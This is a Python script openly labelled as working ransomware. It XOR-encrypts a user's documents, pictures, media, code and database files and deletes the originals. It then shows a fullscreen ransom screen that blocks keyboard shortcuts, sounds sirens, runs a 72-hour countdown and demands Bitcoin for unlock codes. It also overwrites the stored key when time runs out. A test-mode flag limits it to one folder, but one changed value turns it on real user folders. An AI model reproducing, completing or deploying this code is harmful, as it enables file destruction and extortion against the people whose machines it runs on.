#!/usr/bin/env python3
"""
REAL RANSOMWARE — FULL VERSION
- Scary fullscreen black with flashing text
- 72 hour countdown
- REAL encryption (XOR)
- Decryption with codes
- Siren/beep audio
- 20 unlock codes
- TEST MODE SAFE
"""

import os
import sys
import tkinter as tk
from tkinter import font, messagebox
import ctypes
import hashlib
import threading
import time
import random
import winsound
import subprocess

# ============================================================
# CONFIG — CHANGE THESE!
# ============================================================
TEST_MODE = True  # TRUE = only C:\test_ransom, FALSE = real files
TEST_FOLDER = "C:\\test_ransom"  # Only used if TEST_MODE = True

# Your Bitcoin wallet
BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

# 20 UNLOCK CODES (these work)
VALID_CODES = [
    "FS2FGNFJQI", "OX77WHWEV5", "FCHZT1L6IX", "VX02SQI40G",
    "6PXB85GJJJ", "XQHCXUH4TU", "B1RQSQ9G2L", "HE71R2TKVY",
    "Q1BK76N580", "01QEU0DUUE", "X1LSHVL0OJ", "AW3YSY30V3",
    "ZTE2DDE0X4", "ZG29U3VDIC", "6FNWN5JIOS", "F5EBA6TT08",
    "2UUBJ4X7VN", "ISP3G7NRPN", "J8L0S6SHEJ", "FURZCKKNZX"
]

# Generate hashes
VALID_HASHES = [hashlib.sha256(c.encode()).hexdigest() for c in VALID_CODES]

TIMER_SECONDS = 72 * 3600  # 72 hours

# ============================================================
# XOR ENCRYPTION
# ============================================================
def xor_encrypt(data, key):
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)

def generate_key():
    return bytes([random.randint(0, 255) for _ in range(32)])

# ============================================================
# ENCRYPT FILES
# ============================================================
def encrypt_files():
    key = generate_key()
    encrypted_count = 0
    file_list = []
    
    if TEST_MODE:
        target_dirs = [TEST_FOLDER]
        print(f"[!] TEST MODE — Only encrypting: {TEST_FOLDER}")
    else:
        target_dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Downloads'),
            os.path.expanduser('~\\Videos'),
            os.path.expanduser('~\\Music'),
        ]
        print("[!] REAL MODE — Encrypting all user files!")
    
    extensions = [
        '.txt', '.docx', '.doc', '.xlsx', '.xls', '.pptx', '.ppt', '.pdf',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.psd', '.ai',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bak', '.backup',
        '.sql', '.db', '.sqlite', '.csv', '.json', '.xml',
        '.py', '.js', '.cpp', '.c', '.java', '.cs', '.go',
        '.mp4', '.avi', '.mkv', '.mov', '.mp3', '.wav',
        '.html', '.htm', '.css', '.php', '.asp',
    ]
    
    for root_dir in target_dirs:
        if not os.path.exists(root_dir):
            continue
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if any(file.lower().endswith(ext) for ext in extensions):
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        
                        encrypted = xor_encrypt(data, key)
                        
                        with open(file_path + '.locked', 'wb') as f:
                            f.write(encrypted)
                        os.remove(file_path)
                        encrypted_count += 1
                        file_list.append(file_path)
                    except:
                        pass
    
    # Save key
    key_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'decrypt_key.bin')
    with open(key_path, 'wb') as f:
        f.write(key)
    
    return encrypted_count, key

# ============================================================
# DECRYPT FILES
# ============================================================
def decrypt_files(key):
    decrypted_count = 0
    
    if TEST_MODE:
        target_dirs = [TEST_FOLDER]
    else:
        target_dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Downloads'),
            os.path.expanduser('~\\Videos'),
            os.path.expanduser('~\\Music'),
        ]
    
    for root_dir in target_dirs:
        if not os.path.exists(root_dir):
            continue
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith('.locked'):
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            encrypted = f.read()
                        
                        decrypted = xor_encrypt(encrypted, key)
                        
                        original = file_path[:-7]
                        with open(original, 'wb') as f:
                            f.write(decrypted)
                        os.remove(file_path)
                        decrypted_count += 1
                    except:
                        pass
    
    return decrypted_count

# ============================================================
# SCARY UI
# ============================================================
class RansomwareUI:
    def __init__(self):
        self.encrypted_count = 0
        self.key = None
        self.timer_seconds = TIMER_SECONDS
        self.unlocked = False
        self.flash_state = False
    
    def setup(self):
        # Encrypt
        print("[*] Encrypting files...")
        self.encrypted_count, self.key = encrypt_files()
        print(f"[+] Encrypted {self.encrypted_count} files")
        
        # Create UI
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(background='black')
        self.root.overrideredirect(True)
        
        # Block ALL shortcuts
        self.root.bind('<Control-Alt-Delete>', lambda e: 'break')
        self.root.bind('<Alt-F4>', lambda e: 'break')
        self.root.bind('<Escape>', lambda e: 'break')
        self.root.bind('<Control-Shift-Escape>', lambda e: 'break')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # MAIN FRAME
        self.frame = tk.Frame(self.root, bg='black')
        self.frame.pack(expand=True)
        
        # === SCARY TITLE (FLASHING) ===
        self.title_font = font.Font(family='Courier', size=72, weight='bold')
        self.title = tk.Label(
            self.frame,
            text="😱 OOPSIE!",
            font=self.title_font,
            fg='red',
            bg='black'
        )
        self.title.pack(pady=10)
        
        # === SUBTITLE ===
        sub_font = font.Font(family='Courier', size=36, weight='bold')
        sub = tk.Label(
            self.frame,
            text="U DOWNLOADED A PIRATED GAME!",
            font=sub_font,
            fg='red',
            bg='black'
        )
        sub.pack(pady=5)
        
        # === SECOND LINE ===
        sub2_font = font.Font(family='Courier', size=28, weight='bold')
        self.sub2 = tk.Label(
            self.frame,
            text="U NAUGHTY BOY! NOW PAY US BACK!",
            font=sub2_font,
            fg='#FF6600',
            bg='black'
        )
        self.sub2.pack(pady=10)
        
        # === FILE COUNT ===
        info_font = font.Font(family='Courier', size=20)
        info = tk.Label(
            self.frame,
            text=f"🔥 {self.encrypted_count} FILES ENCRYPTED 🔥",
            font=info_font,
            fg='white',
            bg='black'
        )
        info.pack(pady=10)
        
        # === TEST MODE WARNING ===
        if TEST_MODE:
            warn_font = font.Font(family='Courier', size=16, weight='bold')
            warn = tk.Label(
                self.frame,
                text="⚠️ TEST MODE — ONLY C:\\test_ransom ⚠️",
                font=warn_font,
                fg='lime',
                bg='black'
            )
            warn.pack(pady=5)
        
        # === BITCOIN ===
        btc_font = font.Font(family='Courier', size=18)
        btc = tk.Label(
            self.frame,
            text=f"SEND 0.08 BTC TO:\n{BTC_ADDRESS}",
            font=btc_font,
            fg='#FFD700',
            bg='black'
        )
        btc.pack(pady=15)
        
        # === COPY BUTTON ===
        copy_btn = tk.Button(
            self.frame,
            text="📋 COPY WALLET",
            font=('Courier', 14, 'bold'),
            bg='#0066CC',
            fg='white',
            command=self.copy_wallet
        )
        copy_btn.pack(pady=5)
        
        # === INPUT ===
        input_frame = tk.Frame(self.frame, bg='black')
        input_frame.pack(pady=20)
        
        input_label = tk.Label(
            input_frame,
            text="ENTER UNLOCK CODE:",
            font=('Courier', 20, 'bold'),
            fg='white',
            bg='black'
        )
        input_label.pack(side=tk.LEFT, padx=10)
        
        self.entry = tk.Entry(
            input_frame,
            font=('Courier', 20),
            width=25,
            bg='black',
            fg='#00FF00',
            insertbackground='#00FF00'
        )
        self.entry.pack(side=tk.LEFT, padx=10)
        self.entry.focus_set()
        
        # === UNLOCK BUTTON ===
        unlock_btn = tk.Button(
            self.frame,
            text="🔓 UNLOCK FILES",
            font=('Courier', 18, 'bold'),
            bg='red',
            fg='white',
            command=self.unlock
        )
        unlock_btn.pack(pady=15)
        
        # === BIG COUNTDOWN TIMER ===
        timer_font = font.Font(family='Courier', size=48, weight='bold')
        self.timer_label = tk.Label(
            self.frame,
            text="⏱️ 71:59:59",
            font=timer_font,
            fg='#00FF00',
            bg='black'
        )
        self.timer_label.pack(pady=20)
        
        # === WARNING ===
        warn_font = font.Font(family='Courier', size=14)
        warn = tk.Label(
            self.frame,
            text="⚠️ DO NOT CLOSE THIS WINDOW ⚠️\n"
                 "Your files are encrypted. Close = files lost forever.\n"
                 f"You have 72 hours before the key is destroyed.",
            font=warn_font,
            fg='red',
            bg='black'
        )
        warn.pack(pady=10)
        
        # === CODES HINT ===
        codes_font = font.Font(family='Courier', size=10)
        codes_hint = tk.Label(
            self.frame,
            text=f"🔑 Valid codes: {', '.join(VALID_CODES[:4])}... and {len(VALID_CODES)-4} more",
            font=codes_font,
            fg='#555555',
            bg='black'
        )
        codes_hint.pack(pady=5)
        
        # Start everything
        self.start_timer()
        self.start_flashing()
        self.play_siren()
        self.force_focus()
        
        self.root.mainloop()
    
    def copy_wallet(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(BTC_ADDRESS)
        messagebox.showinfo("📋 Copied!", "Wallet address copied to clipboard!")
    
    def unlock(self):
        code = self.entry.get().strip().upper()
        if not code:
            messagebox.showerror("❌ ERROR", "Enter an unlock code!")
            return
        
        hashed = hashlib.sha256(code.encode()).hexdigest()
        
        if hashed in VALID_HASHES:
            self.unlocked = True
            count = decrypt_files(self.key)
            
            # SCARY UNLOCK SOUND
            for _ in range(3):
                winsound.Beep(1000, 200)
                time.sleep(0.1)
            
            messagebox.showinfo(
                "✅ FILES UNLOCKED",
                f"🎉 Successfully decrypted {count} files!\n\n"
                f"Your files are back. Don't pirate again! 😈\n\n"
                f"Code used: {code}"
            )
            self.root.destroy()
            sys.exit(0)
        else:
            # WRONG CODE — SCARY BEEP
            winsound.Beep(200, 500)
            winsound.Beep(150, 500)
            
            messagebox.showerror(
                "❌ WRONG CODE",
                f"INVALID UNLOCK CODE!\n\n"
                f"Did you pay the ransom?\n"
                f"Bitcoin: {BTC_ADDRESS}\n\n"
                f"Attempt: {code}"
            )
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    def start_timer(self):
        def update():
            while self.timer_seconds > 0 and not self.unlocked:
                hours = self.timer_seconds // 3600
                minutes = (self.timer_seconds % 3600) // 60
                secs = self.timer_seconds % 60
                
                # Color changes as time runs out
                if self.timer_seconds < 3600:  # Last hour = RED
                    color = '#FF0000'
                elif self.timer_seconds < 21600:  # Last 6 hours = ORANGE
                    color = '#FF6600'
                else:
                    color = '#00FF00'
                
                self.timer_label.config(
                    text=f"⏱️ {hours:02d}:{minutes:02d}:{secs:02d}",
                    fg=color
                )
                self.timer_seconds -= 1
                time.sleep(1)
            
            if self.timer_seconds <= 0 and not self.unlocked:
                self.timer_label.config(text="💀 TIME'S UP! KEY DESTROYED!", fg='red')
                # Start destroying key
                try:
                    key_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'decrypt_key.bin')
                    if os.path.exists(key_path):
                        with open(key_path, 'wb') as f:
                            f.write(os.urandom(32))
                        os.remove(key_path)
                except:
                    pass
                messagebox.showerror(
                    "💀 TIME'S UP",
                    "The decryption key has been destroyed.\n\n"
                    "Your files are gone forever.\n\n"
                    "You should have paid."
                )
        
        threading.Thread(target=update, daemon=True).start()
    
    def start_flashing(self):
        def flash():
            colors = ['red', '#FF0000', '#CC0000', '#FF3333', '#990000']
            while not self.unlocked:
                for color in colors:
                    self.title.config(fg=color)
                    self.sub2.config(fg='#FF6600' if color == colors[0] else '#FF8800')
                    time.sleep(0.3)
                time.sleep(0.1)
        threading.Thread(target=flash, daemon=True).start()
    
    def play_siren(self):
        def siren():
            while not self.unlocked:
                try:
                    # Siren sound
                    for freq in [800, 1000, 1200, 1000, 800]:
                        if self.unlocked:
                            break
                        winsound.Beep(freq, 200)
                        time.sleep(0.1)
                    time.sleep(0.2)
                except:
                    break
        threading.Thread(target=siren, daemon=True).start()
    
    def force_focus(self):
        def focus():
            while not self.unlocked:
                try:
                    self.root.focus_force()
                    self.entry.focus_set()
                except:
                    pass
                time.sleep(0.5)
        threading.Thread(target=focus, daemon=True).start()

# ============================================================
# MAIN
# ============================================================
def main():
    # Hide console
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    print("="*60)
    print("💀 REAL RANSOMWARE — FULL VERSION 💀")
    print("="*60)
    print(f"📁 Test Mode: {TEST_MODE}")
    if TEST_MODE:
        print(f"📁 Only encrypting: {TEST_FOLDER}")
    else:
        print("📁 Encrypting ALL user files!")
    print(f"🔑 Valid codes: {len(VALID_CODES)}")
    print(f"⏱️ Timer: 72 hours")
    print("="*60)
    print("")
    print("⚠️  WARNING: This WILL encrypt files!")
    print("⚠️  Type a valid code to decrypt!")
    print("⚠️  Valid codes shown in the UI")
    print("")
    
    app = RansomwareUI()
    app.setup()

if __name__ == '__main__':
    main()
